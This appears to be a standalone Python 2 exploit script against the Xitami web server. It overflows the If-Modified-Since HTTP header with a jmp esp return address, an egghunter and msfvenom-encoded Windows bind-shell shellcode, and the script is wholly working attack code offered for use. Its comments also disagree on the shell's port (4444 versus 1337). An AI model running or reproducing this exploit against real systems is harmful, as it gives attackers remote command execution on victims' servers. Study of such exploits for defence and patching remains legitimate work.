import time
import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

egghunt = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"w00t" # 4 byte tag
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=192.168.37.131 LPORT=4444 -e x86/alpha_mixed -f c

shellcode = ("\xd9\xf7\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58"
"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c"
"\x58\x68\x6d\x52\x45\x50\x65\x50\x45\x50\x35\x30\x6b\x39\x4a"
"\x45\x44\x71\x69\x50\x62\x44\x6c\x4b\x76\x30\x56\x50\x6c\x4b"
"\x33\x62\x54\x4c\x6c\x4b\x46\x32\x74\x54\x4c\x4b\x42\x52\x76"
"\x48\x34\x4f\x4d\x67\x52\x6a\x67\x56\x36\x51\x39\x6f\x6c\x6c"
"\x67\x4c\x61\x71\x61\x6c\x54\x42\x76\x4c\x35\x70\x7a\x61\x4a"
"\x6f\x74\x4d\x67\x71\x6b\x77\x4b\x52\x59\x62\x42\x72\x72\x77"
"\x6c\x4b\x52\x72\x34\x50\x6e\x6b\x32\x6a\x65\x6c\x4c\x4b\x62"
"\x6c\x67\x61\x71\x68\x4b\x53\x52\x68\x65\x51\x58\x51\x73\x61"
"\x4e\x6b\x66\x39\x35\x70\x46\x61\x49\x43\x4c\x4b\x72\x69\x34"
"\x58\x69\x73\x67\x4a\x47\x39\x6c\x4b\x36\x54\x6e\x6b\x66\x61"
"\x6e\x36\x76\x51\x59\x6f\x6e\x4c\x6b\x71\x6a\x6f\x76\x6d\x57"
"\x71\x78\x47\x70\x38\x6d\x30\x53\x45\x58\x76\x55\x53\x63\x4d"
"\x39\x68\x35\x6b\x61\x6d\x36\x44\x71\x65\x49\x74\x70\x58\x6e"
"\x6b\x32\x78\x65\x74\x66\x61\x5a\x73\x55\x36\x4c\x4b\x36\x6c"
"\x30\x4b\x4e\x6b\x32\x78\x55\x4c\x75\x51\x48\x53\x6c\x4b\x45"
"\x54\x6c\x4b\x66\x61\x48\x50\x4d\x59\x30\x44\x55\x74\x57\x54"
"\x31\x4b\x61\x4b\x51\x71\x46\x39\x42\x7a\x53\x61\x4b\x4f\x59"
"\x70\x61\x4f\x43\x6f\x72\x7a\x4e\x6b\x36\x72\x68\x6b\x4c\x4d"
"\x51\x4d\x45\x38\x35\x63\x55\x62\x35\x50\x37\x70\x51\x78\x32"
"\x57\x31\x63\x67\x42\x61\x4f\x50\x54\x42\x48\x42\x6c\x43\x47"
"\x61\x36\x53\x37\x79\x6f\x5a\x75\x4d\x68\x4e\x70\x57\x71\x43"
"\x30\x47\x70\x36\x49\x79\x54\x30\x54\x32\x70\x72\x48\x77\x59"
"\x6d\x50\x62\x4b\x75\x50\x79\x6f\x4e\x35\x31\x7a\x33\x38\x30"
"\x59\x70\x50\x6b\x52\x49\x6d\x37\x30\x46\x30\x53\x70\x30\x50"
"\x62\x48\x78\x6a\x74\x4f\x4b\x6f\x69\x70\x59\x6f\x6b\x65\x4e"
"\x77\x75\x38\x37\x72\x43\x30\x36\x71\x63\x6c\x6c\x49\x78\x66"
"\x70\x6a\x66\x70\x70\x56\x43\x67\x63\x58\x7a\x62\x49\x4b\x36"
"\x57\x53\x57\x49\x6f\x6b\x65\x71\x47\x30\x68\x4c\x77\x58\x69"
"\x34\x78\x6b\x4f\x49\x6f\x78\x55\x46\x37\x65\x38\x63\x44\x4a"
"\x4c\x47\x4b\x78\x61\x79\x6f\x4e\x35\x50\x57\x6c\x57\x42\x48"
"\x73\x45\x42\x4e\x50\x4d\x33\x51\x4b\x4f\x5a\x75\x61\x78\x30"
"\x63\x30\x6d\x42\x44\x35\x50\x6f\x79\x38\x63\x61\x47\x50\x57"
"\x32\x77\x70\x31\x79\x66\x43\x5a\x55\x42\x61\x49\x36\x36\x39"
"\x72\x69\x6d\x75\x36\x48\x47\x32\x64\x74\x64\x77\x4c\x75\x51"
"\x73\x31\x4c\x4d\x62\x64\x44\x64\x62\x30\x38\x46\x63\x30\x50"
"\x44\x63\x64\x46\x30\x76\x36\x56\x36\x63\x66\x37\x36\x61\x46"
"\x62\x6e\x73\x66\x32\x76\x30\x53\x31\x46\x65\x38\x34\x39\x4a"
"\x6c\x45\x6f\x4c\x46\x6b\x4f\x68\x55\x6f\x79\x49\x70\x72\x6e"
"\x53\x66\x77\x36\x39\x6f\x34\x70\x43\x58\x35\x58\x4b\x37\x47"
"\x6d\x43\x50\x79\x6f\x59\x45\x4d\x6b\x4c\x30\x4c\x75\x6d\x72"
"\x56\x36\x42\x48\x6d\x76\x4e\x75\x6f\x4d\x4f\x6d\x6b\x4f\x4e"
"\x35\x45\x6c\x66\x66\x63\x4c\x66\x6a\x6d\x50\x69\x6b\x49\x70"
"\x74\x35\x67\x75\x6f\x4b\x57\x37\x77\x63\x71\x62\x42\x4f\x62"
"\x4a\x35\x50\x56\x33\x59\x6f\x49\x45\x41\x41")

jump = "\xeb\x22" # short jump

buf = "A" * 72                  
buf += "\xD7\x30\x9D\x7C" # jmp esp (user32.dll) / XP SP3 English
buf += jump
buf += "\x90" * 50
buf += egghunt
buf += "w00tw00t" # tag
buf += shellcode

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"